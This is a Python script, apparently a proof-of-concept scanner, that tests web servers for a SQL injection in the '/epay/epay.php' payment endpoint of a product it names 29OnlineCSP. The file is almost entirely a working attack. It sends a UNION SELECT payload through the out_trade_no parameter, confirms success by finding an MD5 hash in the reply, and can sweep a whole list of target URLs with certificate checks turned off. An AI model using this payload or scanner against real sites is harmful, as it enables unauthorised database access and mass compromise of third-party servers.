import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/epay/epay.php")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        data="""out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(md5(123456) AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -"""
        response = requests.post(target, headers = headers, data = data,verify = False)
        if response.status_code == 200 and 'out_trade_no' in response.text and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            print(f"\033[31mDiscovered:{url}: 29OnlineCSP_epay_SQLInject!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")